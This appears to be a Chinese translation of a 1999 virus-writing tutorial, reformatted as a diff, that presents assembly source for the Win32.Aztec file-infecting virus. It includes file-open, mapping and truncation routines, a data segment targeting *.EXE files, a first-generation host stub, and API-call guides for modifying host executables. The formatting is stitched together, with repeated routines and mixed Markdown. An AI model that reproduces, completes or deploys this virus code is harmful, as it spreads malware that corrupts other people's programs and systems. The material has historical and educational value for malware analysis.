+TruncFile     proc
+
+        xor     eax,eax
+
+        push    eax
+
+        push    eax
+
+        push    ecx
+
+        push    dword ptr [ebp+FileHandle]
+
+        call    [ebp+_SetFilePointer]
+
+        push    dword ptr [ebp+FileHandle]
+
+        call    [ebp+_SetEndOfFile]
+
+        ret
+
+TruncFile     endp
+
+;---------------------------------------------------------------------------
+
+; SetFilePointer 使文件指针指向一个打开的文件。
+
+;                                                               
+
+; DWORD SetFilePointer(                                        
+
+;   HANDLE hFile,       // 文件的句柄
+
+;   LONG lDistanceToMove,       // 需要移动文件指针的字节数
+
+;   PLONG lpDistanceToMoveHigh, // 要移动距离的高位字
+
+;                           
+
+;   DWORD dwMoveMethod  // 怎么移
+
+;  );                                                          
+
+;                                                               
+
+; 参数
+
+; ====
+
+;                                                               
+
+; ?hFile: 指需要移动移动文件指针的文件。这个文件句柄必须是用 GENERIC_READ 或 GENERIC_WRITE 
+
+;   方式创建的。
+
+;                                                               
+
+; ?lDistanceToMove: 指要移动文件指针的字节数。一个正值表示指针向前移动，而一个负
+
+;   值表示文件指针向后移动。
+
+;                                                               
+
+; ?lpDistanceToMoveHigh: 指向 64 位距离的高位字。如果这个参数的值是 NULL,SetFilePointer
+
+;   只能操作最大为 2³² - 2 的文件。如果这个参数被指定了，最大文件大小是 2⁶⁴ - 2。
+
+;   这个参数还获取新文件指针的高位值。
+
+;                                                               
+
+; ?dwMoveMethod: 指示文件指针移动的开始的地方。这个参数可以是下面的一个值
+
+;                                                               
+
+;     值          方式                                                  
+
+;                                                               
+
+;   + FILE_BEGIN   - 开始点是 0 或文件开始。如果指定了 FILE_BEGIN，DistanceToMove
+
+;                    被理解为新文件指针的位置。
+
+;   + FILE_CURRENT - 当前文件指针的值是开始点。
+
+;   + FILE_END     - 当前文件尾是开始点。
+
+;                                                               
+
+; 返回值
+
+; ======
+
+;                                                               
+
+; ?如果 SetFilePointer 函数调用成功，返回值是双字新文件指针的低位值，而且如果
+
+;   lpDistanceToMoveHigh 不是 NULL，这个函数把新文件指针的双字的高位赋给由那个参
+
+;   数指向的长整型。
+
+; ?如果函数调用失败而且 lpDistanceToMoveHigh 是 NULL，返回值是 0xFFFFFFFF。想要
+
+;   获得详细的错误信息，调用 GetLastError 函数。
+
+; ?如果函数失败，而且 lpDistanceToMoveHigh 是非-NULL 的，返回值是 0xFFFFFFFF，而且
+
+;   GetLastError 将返回一个值而不 NO_ERROR。
+
+;                                                               
+
+; ---                                                           
+
+;                                                               
+
+; SetEndOfFile 函数把指定文件的 end-of-file (EOF)位置移到文件指针的当前位置。
+
+;                                                               
+
+; BOOL SetEndOfFile(                                              
+
+;   HANDLE hFile        // 要设置 EOF 的文件的句柄
+
+;  );                                                             
+
+;                                                               
+
+; 参数
+
+; ====
+
+;                                                               
+
+; ?hFile: 指示要移动 EOF 位置的文件。这个句柄必须是以 GENERIC_WRITE 访问文件方式
+
+;   创建的。
+
+;                                                               
+
+; 返回    
+
+; ====
+
+;                                                               
+
+; ?如果函数调用成功，返回值是非 0 值
+
+; ?如果函数调用失败，返回值是 0。想要知道详细的错误信息，调用 GetLastError 函数。
+
+;                                                               ;
+
+;---------------------------------------------------------------------------
+
+; 输入:
+
+;     ESI - 指向要打开的文件的名字
+
+; 输出:
+
+;     EAX - 如果成功是文件的句柄。
+
+OpenFile      proc
+
+        xor     eax,eax
+
+        push    eax
+
+        push    eax
+
+        push    00000003h
+
+        push    eax
+
+        inc     eax
+
+        push    eax
+
+        push    80000000h or 40000000h
+
+        push    esi
+
+        call    [ebp+_CreateFileA]
+
+        ret
+
+OpenFile      endp
+
+;---------------------------------------------------------------------------
+
+; CreateFile 函数创建或打开下面的对象，并返回一个可以访问这个对象的句柄：
+
+;                                                               
+
+;     + 文件 (我们只对这个感兴趣)           
+
+;     + pipes                                     
+```
+
+**注释说明：**
+
+*   `SetFilePointer`: 使文件指针指向一个打开的文件。
+    *   `DWORD SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)`
+    *   **参数**:
+        *   `hFile`: 指需要移动移动文件指针的文件。这个文件句柄必须是用 `GENERIC_READ` 或 `GENERIC_WRITE` 方式创建的。
+        *   `lDistanceToMove`: 指要移动文件指针的字节数。一个正值表示指针向前移动，而一个负值表示文件指针向后移动。
+        *   `lpDistanceToMoveHigh`: 指向 64 位距离的高位字。如果这个参数的值是 `NULL`，`SetFilePointer` 只能操作最大为 $2^{32} - 2$ 的文件。如果这个参数被指定了，最大文件大小是 $2^{64} - 2$。这个参数还获取新文件指针的高位值。
+        *   `dwMoveMethod`: 指示文件指针移动的开始的地方。这个参数可以是下面的一个值：
+            *   `FILE_BEGIN`: 开始点是 0 或文件开始。如果指定了 `FILE_BEGIN`，`DistanceToMove` 被理解为新文件指针的位置。
+            *   `FILE_CURRENT`: 当前文件指针的值是开始点。
+            *   `FILE_END`: 当前文件尾是开始点。
+    *   **返回值**:
+        *   如果 `SetFilePointer` 函数调用成功，返回值是双字新文件指针的低位值，而且如果 `lpDistanceToMoveHigh` 不是 `NULL`，这个函数把新文件指针的双字的高位赋给由那个参数指向的长整型。
+        *   如果函数调用失败而且 `lpDistanceToMoveHigh` 是 `NULL`，返回值是 `0xFFFFFFFF`。想要获得详细的错误信息，调用 `GetLastError` 函数。
+        *   如果函数失败，而且 `lpDistanceToMoveHigh` 是非-`NULL` 的，返回值是 `0xFFFFFFFF`，而且 `GetLastError` 将返回一个值而不 `NO_ERROR`。
+
+*   `SetEndOfFile`: 函数把指定文件的 `end-of-file` (`EOF`) 位置移到文件指针的当前位置。
+    *   `BOOL SetEndOfFile(HANDLE hFile)`
+    *   **参数**:
+        *   `hFile`: 指示要移动 `EOF` 位置的文件。这个句柄必须是以 `GENERIC_WRITE` 访问文件方式创建的。
+    *   **返回**:
+        *   如果函数调用成功，返回值是非 0 值。
+        *   如果函数调用失败，返回值是 0。想要知道详细的错误信息，调用 `GetLastError` 函数。
+
+*   `CreateFile`: 函数创建或打开下面的对象，并返回一个可以访问这个对象的句柄：
+    *   文件 (我们只对这个感兴趣)
+    *   pipes
+
+```
+        ;---------------------------------------------------------------------------
+        ; 输入:
+        ;     ESI - 指向要打开的文件的名字
+        ; 输出:
+        ;     EAX - 如果成功是文件的句柄。
+
+        OpenFile        proc
+            xor     eax,eax
+            push    eax
+            push    eax
+            push    00000003h
+            push    eax
+            inc     eax
+            push    eax
+            push    80000000h or 40000000h
+            push    esi
+            call    [ebp+_CreateFileA]
+            ret
+        OpenFile        endp
+```
+
+
+
+- `mailslots`
+- `communications resources`
+- `disk devices` (Windows NT only)
+- `consoles`
+- `directories` (open only)
+
+```
+; HANDLE CreateFile(
+;   LPCTSTR lpFileName, //  指向文件的名字
+;   DWORD dwDesiredAccess,      // 访问 (读-写) 模式
+;   DWORD dwShareMode,  // 共享模式
+;   LPSECURITY_ATTRIBUTES lpSecurityAttributes, // 指向安全属性
+;   DWORD dwCreationDistribution,       // 怎么创建
+;   DWORD dwFlagsAndAttributes, // 文件属性
+;   HANDLE hTemplateFile        // 要复制的属性的文件的句柄
+;  );
+```
+
+### 参数
+
+- `lpFileName`: 指向一个以 `NULL` 结尾的字符串，这个字符串指定要创建或打开的对象(文件, 管道, 邮槽, 通信资源, 磁盘设备, 控制台, 或目录)的名字。
+  如果 `*lpFileName` 是一个路径，就有一个缺省的路径字符个数的 `MAX_PATH` 个数限制，这个限制和 `CreateFile` 函数怎么解析路径有关。
+
+- `dwDesiredAccess`: 指访问的对象的类型。一个应用程序可以获得读访问，写访问，读-写 访问，或者设备查询访问。
+
+- `dwShareMode`: 设置一些标志来指定对象是怎么共享的。如果 `dwShareMode` 是 0，这个对象 就不能关系。随后的对这个对象的打开操作也会失败，直到句柄被关闭。
+
+- `lpSecurityAttributes`: 指向一个 `SECURITY_ATTRIBUTES` 结构，来确定返回的句柄是 否能从子进程继承。如果 `lpSecurityAttributes` 是 `NULL`，句柄就不能继承。
+
+- `dwCreationDistribution`: 指对文件采取已知的什么行动，和未知的行动。
+
+- `dwFlagsAndAttributes`: 指文件的属性和标志。
+
+- `hTemplateFile`: 指用 `GENERIC_READ` access 访问一个模板文件的句柄。这个模板文件在 文件创建的时候提供文件属性和扩展的属性。`Windows 95`: 这个值必须为 `NULL`。如果你 在 `Windows 95` 下提供一个句柄，这个调用会失败而且 `GetLastError` 返回 `ERROR_NOT_SUPPORTED`。
+
+### 返回值
+
+- 如果函数成功了，返回值是一个打开的指定文件的句柄。如果指定的文件在函数调用前存 在和 `dwCreationDistribution` 是 `CREATE_ALWAYS` 或 `OPEN_ALWAYS` 的时候，一个调用 `GetLastError` 函数会返回 `ERROR_ALREADY_EXISTS`(甚至函数成功了)。如果文件在 调用之前不存在，`GetLastError` 将返回 0。
+- 如果函数失败了，返回值是 `INVALID_HANDLE_VALUE`。为了获取信息的错误信息，调用 `GetLastError`。
+
+```
+; 输入:
+;      ECX - 映射大小
+; 输出:
+;      EAX - 如果成功为映射句柄
+CreateMap       proc
+        xor     eax,eax
+        push    eax
+        push    ecx
+        push    eax
+        push    00000004h
+        push    eax
+        push    dword ptr [ebp+FileHandle]
+        call    [ebp+_CreateFileMappingA]
+        ret
+CreateMap       endp
+```
+
+`CreateFileMapping` 函数为指定文件创建一个命名的或未命名的文件映射对象。
+
+```
+; HANDLE CreateFileMapping(
+;   HANDLE hFile,       // 要映射的文件的句柄
+;   LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // 可选安全属性
+;   DWORD flProtect,    // 为映射对象保护
+;   DWORD dwMaximumSizeHigh,    // 32 位对象大小的高位
+;   DWORD dwMaximumSizeLow,     // 32 位对象大小的低位
+;   LPCTSTR lpName      // 文件映射对象的名字
+;  );
+```
+
+### 参数
+
+- `hFile`: 指从哪个文件创建映射对象。这个文件必须以和由 `flProtect` 参数指定的包含标 志相兼容的访问模式打开。建议，虽然不是必须，你打算映射的文件应该以独占方式打 开。
+  如果 `hFile` 是 `(HANDLE)0xFFFFFFFF`，调用进程还必须在 `dwMaximumSizeHigh` 和 `dwMaximumSizeLow` 参数中指定映射对象的大小。这个函数是通过操作系统的页文件 而不是文件系统中的命名文件来创建一个指定大小的文件映射对象的。文件映射对象 可通过复制，继承或命名来共享。
+
+- `lpFileMappingAttributes`: 指向一个 `SECURITY_ATTRIBUTES` 结构，决定返回的句柄是 否可以被子进程继承。如果 `lpFileMappingAttributes` 是 `NULL`,句柄就不能被继承。
+
+- `flProtect`: 指定当文件被映射的时候文件需要的保护。
+
+- `dwMaximumSizeHigh`: 指定文件映射对象的 32 位最大大小的高位。
+
+- `dwMaximumSizeLow`: 指定文件映射对象的 32 位最大大小的低位。如果这个参数和 `dwMaximumSizeHig` 为 0，那么文件映射对象的最大大小等于有 `hFile` 确定的文件的 当前大小。
+
+- `lpName`: 指向一个 `NULL` 结尾的字符串来指定映射对象的名字。这个名字可以包含除了反 斜线符号(`\`)之外的所有字符。
+  如果这个参数和已经存在的命名了的映射对象的名字相同，这个函数请求通过由 `flProtect` 指定的保护来访问映射对象。
+  如果参数是 `NULL`，映射对象就不通过命名创建。
+
+### 返回值
+
+- 如果函数成功，返回值是一个文件映射对象的句柄。如果在调用这个函数之前对象已经 存在了，`GetLastError` 函数将返回 `ERROR_ALREADY_EXISTS`，而且返回值是一个已 经存在的文件映射对象(由当前的大小，而不是新的指定大小)的合法句柄。如果映射 对象不存在，`GetLastError` 返回 0。
+- 如果函数失败，返回值是 `NULL`。想要知道详细的错误信息，调用 `GetLastError` 函数。
+
+```
+; input:
+;      ECX - Size to map
+; output:
+;      EAX - MapAddress if succesful
+MapFile         proc
+        xor     eax,eax
+        push    ecx
+        push    eax
+        push    eax
+        push    00000002h
+        push    dword ptr [ebp+MapHandle]
+        call    [ebp+_MapViewOfFile]
+        ret
+MapFile         endp
+```
+
+`MapViewOfFile` 函数映射一个文件视图到调用进程的地址空间中去。
+
+```
+; LPVOID MapViewOfFile(
+;   HANDLE hFileMappingObject,  // 要映射的文件映射对象       
+;   DWORD dwDesiredAccess,      // 访问模式                        
+;   DWORD dwFileOffsetHigh,     // 32 位文件偏移地址的高位       
+;   DWORD dwFileOffsetLow,      // 32 位文件偏移地址的低位        
+;   DWORD dwNumberOfBytesToMap  // 要映射的字节数           
+;  );
+```
+
+### 参数
+
+- `hFileMappingObject`: 指定一个打开的文件映射对象的句柄。`CreateFileMapping` 和 `OpenFileMapping` 函数返回这个句柄。
+
+- `dwDesiredAccess`: 指访问文件视图的类型，而且因此页的保护由这个文件映射。
+
+- `dwFileOffsetHigh`: 指映射开始的偏移地址的高 32 位。
+
+- `dwFileOffsetLow`: 指映射开始的偏移地址的低 32 位。
+
+- `dwNumberOfBytesToMap`: 指文件映射的字节数。如果 `dwNumberOfBytesToMap` 是 0，那么 整个文件将被映射。
+
+### 返回值
+
+
+
+### API 返回值说明
+
+如果函数调用成功，返回值是映射视图开始的地址。
+
+如果函数调用失败，返回值是 `NULL`。想要知道详细的错误信息，调用 `GetLastError`。
+
+### 数据段定义
+
+```asm
+mark_ db "[Win32.Aztec v1.01]",0
+      db "(c) 1999 Billy Belcebu/iKX",0
+
+EXE_MASK db "*.EXE",0
+
+infections dd 00000000h
+kernel dd kernel_
+
+@@Namez label byte
+
+@FindFirstFileA db "FindFirstFileA",0
+@FindNextFileA db "FindNextFileA",0
+@FindClose db "FindClose",0
+@CreateFileA db "CreateFileA",0
+@SetFilePointer db "SetFilePointer",0
+@SetFileAttributesA db "SetFileAttributesA",0
+@CloseHandle db "CloseHandle",0
+@GetCurrentDirectoryA db "GetCurrentDirectoryA",0
+@SetCurrentDirectoryA db "SetCurrentDirectoryA",0
+@GetWindowsDirectoryA db "GetWindowsDirectoryA",0
+@GetSystemDirectoryA db "GetSystemDirectoryA",0
+@CreateFileMappingA db "CreateFileMappingA",0
+@MapViewOfFile db "MapViewOfFile",0
+@UnmapViewOfFile db "UnmapViewOfFile",0
+@SetEndOfFile db "SetEndOfFile",0
+
+      db 0BBh
+      align dword
+
+virus_end label byte
+heap_start label byte
+      dd 00000000h
+
+NewSize dd 00000000h
+SearchHandle dd 00000000h
+FileHandle dd 00000000h
+MapHandle dd 00000000h
+MapAddress dd 00000000h
+AddressTableVA dd 00000000h
+NameTableVA dd 00000000h
+OrdinalTableVA dd 00000000h
+
+@@Offsetz label byte
+
+_FindFirstFileA dd 00000000h
+_FindNextFileA dd 00000000h
+_FindClose dd 00000000h
+_CreateFileA dd 00000000h
+_SetFilePointer dd 00000000h
+_SetFileAttributesA dd 00000000h
+_CloseHandle dd 00000000h
+_GetCurrentDirectoryA dd 00000000h
+_SetCurrentDirectoryA dd 00000000h
+_GetWindowsDirectoryA dd 00000000h
+_GetSystemDirectoryA dd 00000000h
+_CreateFileMappingA dd 00000000h
+_MapViewOfFile dd 00000000h
+_UnmapViewOfFile dd 00000000h
+_SetEndOfFile dd 00000000h
+
+MAX_PATH equ 260
+
+FILETIME STRUC
+FT_dwLowDateTime dd ?
+FT_dwHighDateTime dd ?
+FILETIME ENDS
+
+WIN32_FIND_DATA label byte
+WFD_dwFileAttributes dd ?
+WFD_ftCreationTime FILETIME ?
+WFD_ftLastAccessTime FILETIME ?
+WFD_ftLastWriteTime FILETIME ?
+WFD_nFileSizeHigh dd ?
+WFD_nFileSizeLow dd ?
+WFD_dwReserved0 dd ?
+WFD_dwReserved1 dd ?
+WFD_szFileName db MAX_PATH dup (?)
+WFD_szAlternateFileName db 13 dup (?)
+      db 03 dup (?)
+
+directories label byte
+WindowsDir db 7Fh dup (00h)
+SystemDir db 7Fh dup (00h)
+OriginDir db 7Fh dup (00h)
+dirs2inf equ (($-directories)/7Fh)
+mirrormirror db dirs2inf
+heap_end label byte
+```
+
+### 病毒代码逻辑
+
+上面所有的都是病毒要使用的数据;)
+
+#### 第一代宿主程序
+
+```asm
+fakehost:
+    pop dword ptr fs:[0] ; 清除堆栈
+    add esp,4
+    popad
+    popfd
+    xor eax,eax ; 用第一次生成的无聊的信息显示 MessageBox
+    push eax
+    push offset szTitle
+    push offset szMessage
+    push eax
+    call MessageBoxA
+    push 00h ; 终止第一次生成
+    call ExitProcess
+end aztec
+```
+
+#### 病毒分析与 API 调用指南
+
+好了，我认为关于这个病毒我已经解释得够清楚了。它只是一个简单的直接行为(运行期)病毒，能够在所有的 `Win32` 平台上工作，而且在当前目录，`Windows` 目录和系统目录上感染 5 个文件。它没有任何隐藏自己的机制(因为它是一个示例病毒)，而且我想它能够被所有的反病毒软件检测到。所以它不值得改变字符串并声称是它的作者。你应该自己做。因为我知道病毒的一些部分还不够清晰(如那些调用 API 函数，如完成一个任务用的值)，下面就简要地列举出怎么调用一些 API 来做具体地事情。
+
+##### 怎么打开一个文件进行读写?
+
+我们用来做这个的 API 是 `CreateFileA`。建议参数如下：
+
+```asm
+    push    00h                 ; hTemplateFile
+    push    00h                 ; dwFlagsAndAttributes
+    push    03h                 ; dwCreationDistribution
+    push    00h                 ; lpSecurityAttributes
+    push    01h                 ; dwShareMode
+    push    80000000h or 40000000h ; dwDesiredAccess
+    push    offset filename     ; lpFileName
+    call    CreateFileA
+```
+
++ `hTemplateFile`, `dwFlagsAndAttributes` 和 `lpSecurityAttributes` 应该为 `0`。
++ `dwCreationDistribution`, 有一些有趣的值。它可以为:
+  * `CREATE_NEW` = `01h`
+  * `CREATE_ALWAYS` = `02h`
+  * `OPEN_EXISTING` = `03h`
+  * `OPEN_ALWAYS` = `04h`
+  * `TRUNCATE_EXISTING` = `05h`
+
+当我们想要打开一个已经存在的文件的时候，我们使用 `OPEN_EXISTING`，即 `03h`。如果我们因为病毒的需要而要打开一个模板文件，我们在这里将要使用另外一个值，如 `CREATE_ALWAYS`。
+
++ `dwShareMode` 应该为 `01h`, 总之，我们可以从下面的值中选择:
+  * `FILE_SHARE_READ` = `01h`
+  * `FILE_SHARE_WRITE` = `02h`
+
+所有文我们让其它人读我们打开的文件，但是不能写!
+
++ `dwDesiredAccess` 处理访问文件的选择。我们使用 `C0000000h`,因为它是 `GENERIC_READ` 和 `GENERIC_WRITE` 的和，那就意味着我们两个访问方式都要:)下面你得到:
+  * `GENERIC_READ` = `80000000h`
+  * `GENERIC_WRITE` = `40000000h`
+
+**如果有一个失败，这个调用 `CreateProcess` 将会返回给我们 `0xFFFFFFFF`；如果没有任何失败，它将返回给我们打开文件的句柄，所以，我们将它保存到相关变量中。要关闭那个句柄(需要的时候)使用 `CloseHandle` 这个 API 函数。**
+
+##### 怎样创建一个打开文件的映射?
+
+要用到的 API 是 `CreateFileMappingA`。建议的参数为：
+
+```asm
+    push    00h                 ; lpName
+    push    size_to_map         ; dwMaximumSizeLow
+    push    00h                 ; dwMaximumSizeHigh
+    push    04h                 ; flProtect
+    push    00h                 ; lpFileMappingAttributes
+    push    file_handle         ; hFile
+    call    CreateFileMappingA
+```
+
++ `lpName` 和 `lpFileMappingAttributes` 建议为 `0`。
++ `dwMaximumSizeHigh` 应该为 `0` 除非当 `dwMaximumSizeLow` < `0xFFFFFFFF`
++ `dwMaximumSizeLow` 是我们想要映射的大小
++ `flProtect` 可以为如下的值:
+  * `PAGE_NOACCESS` = `00000001h`
+  * `PAGE_READONLY` = `00000002h`
+  * `PAGE_READWRITE` = `00000004h`
+  * `PAGE_WRITECOPY` = `00000008h`
+  * `PAGE_EXECUTE` = `00000010h`
+  * `PAGE_EXECUTE_READ` = `00000020h`
+  * `PAGE_EXECUTE_READWRITE` = `00000040h`
+  * `PAGE_EXECUTE_WRITECOPY` = `00000080h`
+  * `PAGE_GUARD` = `00000100h`
+  * `PAGE_NOCACHE` = `00000200h`
+
+我建议你使用 `PAGE_READWRITE`，那个在映射时读或写不出现问题。
+
++ `hFile` 是我们想要映射的先前打开的句柄。
++ **如果失败了，调用这个 API 函数会返回给我们一个 `NULL` 值；否则将会返回给我们映射句柄。我们将把它保存到一个变量中以备后用。要关闭一个映射句柄，要调用的 API 应该为 `CloseHandle`。**
+
+##### 怎么能映射文件?
+
+应该用 `MapViewOfFile` 这个 API 函数，它的建议参数如下：
+
+```asm
+    push    size_to_map         ; dwNumberOfBytesToMap
+    push    00h                 ; dwFileOffsetLow
+    push    00h                 ; dwFileOffsetHigh
+    push    02h                 ; dwDesiredAccess
+    push    map_handle          ; hFileMappingObject
+    call    MapViewOfFile
+```
+
++ `dwFileOffsetLow` 和 `dwFileOffsetHigh` 应该为 `0`
++ `dwNumberOfBytesToMap` 是我们想要映射的文件的字节数
++ `dwDesiredAccess` 可以为如下值:
+  * `FILE_MAP_COPY` = `00000001h`
+  * `FILE_MAP_WRITE` = `00000002h`
+  * `FILE_MAP_READ` = `00000004h`
+
+我建议 `FILE_MAP_WRITE`。
+
++ `hFileMappingObject` 应该为映射句柄 (Mapping Handle), 由先前调用的 `CreateFileMappingA` 函数返回。
+
+
+
+如果失败，这个 `API` 将会返回给我们 `NULL`，否则它将返回给我们映射地址（`Mapping Address`）。所以，从那个映射地址，你可以访问映射空间的任何地方，并进行你想要的修改 :) 为了关闭那个映射地址，应该用 `UnmapViewOfFile` 这个 `API`。
+
+-> 怎么关闭文件句柄和映射句柄?
+
+OK，我们必须使用 `CloseHandle` 这个 `API`。
+
+```
+push    handle_to_close            ; hObject
+call    CloseHandle
+```
+
+如果关闭成功，它返回 `1`。
+
+-> 怎么关闭映射地址?
+
+你应该使用 `UnmapViewOfFile`。
+
+```
+push    mapping_address            ; lpBaseAddress
+call    UnmapViewOfFile
+```
+
+如果关闭成功，它返回 `1`。
+
+`4dd466d0e1e0cc123afbe504da2462ca`
